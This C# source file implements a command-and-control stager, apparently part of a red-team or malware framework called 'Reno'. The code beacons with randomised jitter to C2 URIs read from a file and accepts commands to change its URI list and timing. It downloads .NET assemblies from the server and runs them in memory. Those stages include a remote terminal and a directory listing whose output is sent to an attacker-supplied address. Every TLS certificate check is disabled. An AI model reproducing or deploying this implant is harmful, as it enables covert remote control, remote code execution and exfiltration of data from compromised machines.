using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Reflection;
using System.IO;
using System.Text.RegularExpressions;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using Reno.Comm;

namespace Stager
{
    class StageZero : IStageZero
    {
        List<Uri> commandUriList;
        bool uriIsLoaded = false;
        int beacon, jitter;
        Thread mainThread;
        /// <summary>
        /// Creates a new StageZero object that calls back to hosts in the uriFile.
        /// </summary>
        /// <param name="uriFile">List of addresses to initially callback to</param>
        public StageZero(FileInfo uriFile, int beacon, int jitter)
        {
            commandUriList = new List<Uri>();
            if (uriFile.Exists)
            {
                if (LoadUriList(uriFile) > 0)
                    uriIsLoaded = true;
                this.beacon = beacon;
                this.jitter = jitter;
                System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12 | System.Net.SecurityProtocolType.Tls11;
                System.Net.ServicePointManager.ServerCertificateValidationCallback = ValidateServerCertificate;
                mainThread = new Thread(new ThreadStart(Run));
                mainThread.Start();
            }  
        }
        /// <summary>
        /// This method adds a Uri to the list of Uri's to reach out to for finding commands
        /// </summary>
        /// <param name="addUris">The list of URIs from the command retrived. The list is & delimited</param>
        /// <returns>
        /// -1 - Could not add the Uri to the list
        /// 1 - Uri added to the list
        /// </returns>
        public void AddUrisToList(List<Uri> addUris)
        {
            foreach (Uri t in addUris)
            {
                if (!commandUriList.Contains(t))
                {
                    commandUriList.Add(t);
                }
            }
#if DEBUG
            Console.WriteLine("\n[*] Add URIs, now have the following URIs");
            foreach(Uri u in commandUriList)
            {
                Console.WriteLine(u.AbsoluteUri);
            }
#endif
        }
        /// <summary>
        /// This method loads the assembly into the running process
        /// </summary>
        /// <param name="assembly">The assembly to load into memory as a byte array</param>
        /// <param name="arguments">Arguments to use for the assembly to be loaded</param>
        /// <returns>
        /// -1 - byte array is not loaded correctly
        /// 0 - Bad assembly format
        /// 1 - Success
        /// </returns>
        public int LoadStage(byte[] assembly, Dictionary<string, string> arguments)
        {
            ClearChannel channel;
            Assembly s = Assembly.Load(assembly);
            foreach(var type in s.GetTypes())
            {
                if (type.FullName.Equals("Reno.Stages.Terminal"))
                {
                    Assembly a = Assembly.Load(assembly);
                    string server = arguments["server"];
                    int port = 443;
                    string compression = arguments["compression"];
                    if (!Int32.TryParse(arguments["port"], out port))
                    {
                        Console.WriteLine("[-] Error parsing port argument, using default of 443");
                    }
                    channel = new ClearChannel(server, port, compression);
                    object[] p = new object[1];
                    p[0] = channel;
                    var terminalInstance = Activator.CreateInstance(type, p);
                    var executeTerminal = type.GetMethod("Execute");
                    executeTerminal.Invoke(terminalInstance, null);
                }
                else if (type.FullName.Equals("Reno.Stages.DirectoryTraversal"))
                {
                    Assembly a = Assembly.Load(assembly);
                    var traversal = Activator.CreateInstance(type, null);
                    var execute = type.GetMethod("EnumerateDirectoryStructure");
                    string dir = arguments["dir"];
                    string format = arguments["format"];
                    string dstip = arguments["dstip"];
                    string compression = arguments["compression"];
                    int port = 443;
                    if(!Int32.TryParse(arguments["dstport"], out port))
                    {
                        Console.WriteLine("[-] Error parsing port argument, using default of 443");
                    }
                    channel = new ClearChannel(dstip, port, compression);
                    object[] o = { dir, format };
                    object output = execute.Invoke(traversal, o);
                    string sOutput = output.ToString();
                    channel.SendBytes(Encoding.UTF8.GetBytes(sOutput));
                    Console.WriteLine(s);
                    channel.Close();
                }
                else
                {
                    Console.WriteLine("[*] Loaded Type {0}", type);
                    object instance = Activator.CreateInstance(type);
                    object[] args = new object[] { new string[] { "" } };
                    try
                    {
                        type.GetMethod("Execute").Invoke(instance, null);
                        return 1;
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("[-] Error executing command: " + e.Message);
                        return -1;
                    }
                }
            }
            return 1;
        }
        /// <summary>
        /// This method loads the Uri's from the specified file.
        /// The file should be comma separated
        /// </summary>
        /// <param name="uriFile">The full path to the file with the Uri</param>
        /// <returns>
        /// -1 - Failed to open/read the file
        /// 1 - Success
        /// </returns>
        public int LoadUriList(FileInfo uriFile)
        {
            // Read from the file
            FileStream fs = uriFile.OpenRead();
            long fileLength = uriFile.Length;
            byte[] file = new byte[fileLength];
            try
            {
                fs.Read(file, 0, (int)fileLength);
            }
            catch(IOException ioe)
            {
                Console.WriteLine("[-] IO Error opening the URI file: " + ioe.Message);
                return -1;
            }

            string sFile = Encoding.UTF8.GetString(file);

#if DEBUG
            Console.WriteLine("[*] File contents");
            Console.WriteLine(sFile);
            Console.WriteLine("[*] End of File");
#endif

            // Parse the URIs and put them into the list
            foreach (string uri in sFile.Split(','))
            {
                // Make sure the string is formated so the Uri can be created
                Regex r = new Regex(@"^http[s]{0,1}://", RegexOptions.IgnoreCase);
                if (r.IsMatch(uri))
                    commandUriList.Add(new Uri(uri));
                else
                    Console.WriteLine("\n[-] URI Format Error on: " + uri);

            }

#if DEBUG
            Console.WriteLine("\n[*] There are {0} valid URIs in the command list", commandUriList.Count);
            foreach(Uri u in commandUriList){
                Console.WriteLine("[*] Uri {0}: " + u.AbsoluteUri, commandUriList.IndexOf(u) + 1);
            }
#endif
            return 1;
        }
        /// <summary>
        /// Changes the beacon duration based on the arguments received from the C2 server
        /// </summary>
        /// <param name="arguments">Arguments containing the beacon and jitter</param>
        /// <returns>
        /// 1 - if successfull
        /// -1 - if failure
        /// </returns>
        public int ChangeBeacon(Dictionary<string, string> arguments)
        {
            int status = -1;

            foreach(KeyValuePair<string, string> kv in arguments)
            {
                if (kv.Key.Equals("seconds"))
                {
                    if(!Int32.TryParse(kv.Value, out beacon))
                    {
#if DEBUG
                        Console.WriteLine("[-] Failed to parse beacon");
#endif
                    }
                }
                else if (kv.Key.Equals("jitter"))
                {
                    if(!Int32.TryParse(kv.Value, out jitter))
                    {
#if DEBUG
                        Console.WriteLine("[-] Failed to parse jitter");
#endif
                    }
                }
            }

            return status;
        }
        /// <summary>
        /// This method removes a Uri from the command list
        /// </summary>
        /// <param name="removeUris">The list of URIs to remove. The list is & delimited</param>
        /// <returns>
        /// -1 - Failed to remove the Uri
        /// 0 - Uri not found in the list
        /// 1 - Success
        /// </returns>
        public void RemoveUrisFromList(List<Uri> removeUris)
        {
            foreach (Uri t in removeUris)
            {
                if (commandUriList.Contains(t))
                {
                    commandUriList.Remove(t);
                }
            }
#if DEBUG
            Console.WriteLine("\n[*] Removed URIs called, now have the following URIs");
            foreach (Uri u in commandUriList)
            {
                Console.WriteLine(u.AbsoluteUri);
            }
#endif
        }
        /// <summary>
        /// This method reaches out to the specified Uri in an attempt to find a command.
        /// If a command is found, it is stored and then actioned on.
        /// </summary>
        /// <param name="site">The site to connect to</param>
        /// <returns>StagerResult - containing either the command found at the site or a blank StagerResult meaning go to sleep</returns>
        public async Task<StagerCommand> RequestCommand(Uri site)
        {
            HttpClientHandler handler = new HttpClientHandler();
            HttpClient client = new HttpClient(handler);
            StagerCommand stagerCommand = new StagerCommand();
            try
            {
                HttpResponseMessage response = await client.GetAsync(site.AbsoluteUri);
                stagerCommand.HttpStatusCode = response.StatusCode;     // Store the status code before checking if it is a successful one (200 range)
                response.EnsureSuccessStatusCode();     // Throw an exception if the status code isn't success
                string responseBody = await response.Content.ReadAsStringAsync();
                HttpResponseHeaders headers = response.Headers;
                HttpContentHeaders contentHeaders = response.Content.Headers;
                string sHeaders = headers.ToString();
#if DEBUG
                Console.WriteLine("\n[*] Request Sent");
                Console.WriteLine("[*] Headers");
                foreach (KeyValuePair<string, IEnumerable<string>> header in headers)
                {
                    string value = "";
                    foreach(string v in header.Value)
                    {
                        value += v + " ";
                    }
                    Console.WriteLine(header.Key + ": " + value);
                }
                foreach (KeyValuePair<string, IEnumerable<string>> content in contentHeaders)
                {
                    string value = "";
                    foreach (string v in content.Value)
                    {
                        value += v + " ";
                    }
                    Console.WriteLine(content.Key + ": " + value);
                }
                Console.WriteLine("\n[*] Body");
                Console.WriteLine(responseBody);
                Console.WriteLine("[*] End Message");
#endif
                // Get the command and parse it
                int startCommand = responseBody.IndexOf("<command>");
                int endCommand = responseBody.IndexOf("</command>");
                string cmdString = responseBody.Substring(startCommand + "<command>".Length, endCommand - startCommand - "</command>".Length + 1);
                stagerCommand.Timestamp = DateTime.Now;
                stagerCommand.FullCommandString = cmdString;
#if DEBUG
                Console.WriteLine("\n[*] Command string: " + stagerCommand.FullCommandString);
#endif
            }
            catch(HttpRequestException e)
            {
                Console.WriteLine("[-] Error reading from server: " + e.Message);
            }

            return stagerCommand;
        }
        /// <summary>
        /// The method reaches out to the specified Uri to pull down additional abilities.
        /// The stager will request an additional stage when commanded to do so
        /// </summary>
        /// <param name="site">The site to connect to</param>
        /// <returns>StagerResult - contains the result of the request (found the item, didn't find the item) 
        /// and the new stage if it was able to download</returns>
        public async Task<byte[]> RequestStage(Uri site)
        {
            byte[] assembly = { 0 };
            StagerCommand result = new StagerCommand();   // Store all the information in this
            HttpClientHandler handler = new HttpClientHandler();
            HttpClient client = new HttpClient(handler);
            try
            {
#if DEBUG
                Console.WriteLine("\n[*] Requesting {0} for download", site.AbsoluteUri);
#endif
                HttpResponseMessage response = await client.GetAsync(site.AbsoluteUri);
                response.EnsureSuccessStatusCode();
                HttpResponseHeaders responseHeaders = response.Headers;
                HttpContentHeaders contentHeaders = response.Content.Headers;
                string contentType = contentHeaders.ContentType.MediaType;
                long contentLength = contentHeaders.ContentLength ?? 0;     // ContentLength returns long?, so we need to check for null with ??. If null, just return 0;
                if (contentLength > 0)
                {
#if DEBUG
                    Console.WriteLine("[*] Downloading assembly");
#endif
                    assembly = new byte[contentLength];
                    assembly = await response.Content.ReadAsByteArrayAsync();
                }
            }
            catch (HttpRequestException e)
            {
                Console.WriteLine("\n[-] Error opening assembly from source: " + e.Message);
            }
            return assembly;
        }

        public void Run()
        {
            while (true)
            {
                Random rand = new Random((int)DateTimeOffset.Now.ToUnixTimeMilliseconds()); // Pause for the amount of time required
                int randomJitter = rand.Next(jitter);
                int trueJitter;
                
                bool add = true;    // Add or subtract?
                if (rand.NextDouble() < .5)
                    add = false;
                
                if (add)    // Do the jitter math
                    trueJitter = jitter + randomJitter;
                else
                    trueJitter = jitter - randomJitter;
                
                if (trueJitter > beacon)    // Make sure jitter won't make beacon less than 0
                    trueJitter = 0;
#if DEBUG
                Console.WriteLine("[*] Beacon: {0} \tJitter {1}", beacon, jitter);
                Console.WriteLine("[*] Beacon time: {0} \tJitter time {1}\tAdd: {2}", beacon, trueJitter, add);       
#endif
                if (add)    // Now sleep
                    Thread.Sleep((beacon + trueJitter) * 1000);
                else
                    Thread.Sleep((beacon - trueJitter) * 1000);
                /*
                 * The below blocks of code perform the logic for the stager
                 * First, the stager checks for a command and parses it if found.
                 * If the first URI does not return, it will move the URI to the bottom of the list and start the round over.
                 * Second, it will execute the command
                 */
                Task<StagerCommand> cmd = RequestCommand(commandUriList[0]);
                StagerCommand result = cmd.Result;
                if(result.HttpStatusCode != System.Net.HttpStatusCode.OK)
                {
                    Uri tmp = new Uri(commandUriList[0].AbsoluteUri);
                    commandUriList.RemoveAt(0);
                    commandUriList.Add(tmp);
                }
#if DEBUG
                Console.WriteLine("[*] Command: " + result.Command + "\t" + result.FullCommandString);
#endif
                if(result != null)
                {
                    switch (result.Command)
                    {
                        case Command.Add:
                            Console.WriteLine("[*] Add Command");
                            AddUrisToList(result.Uris);
                            break;
                        case Command.Beacon:
                            Console.WriteLine("[*] Beacon Command");
                            ChangeBeacon(result.Arguments);
                            break;
                        case Command.Load:
                            Console.WriteLine("[*] Load Command");
                            byte[] assembly = RequestStage(result.Uris[0]).Result;   // Expected Uri count for a load command is 1
                            LoadStage(assembly, result.Arguments);
                            break;
                        case Command.Remove:
                            Console.WriteLine("[*] Remove Command");
                            RemoveUrisFromList(result.Uris);
                            break;
                    }
                }
            }
        }
        /// <summary>
        /// This method is used as a delegate to allow for communicating to servers that are self-signed.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="certificate"></param>
        /// <param name="chain"></param>
        /// <param name="sslPolicyErrors"></param>
        /// <returns></returns>
        public static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }
    }
}
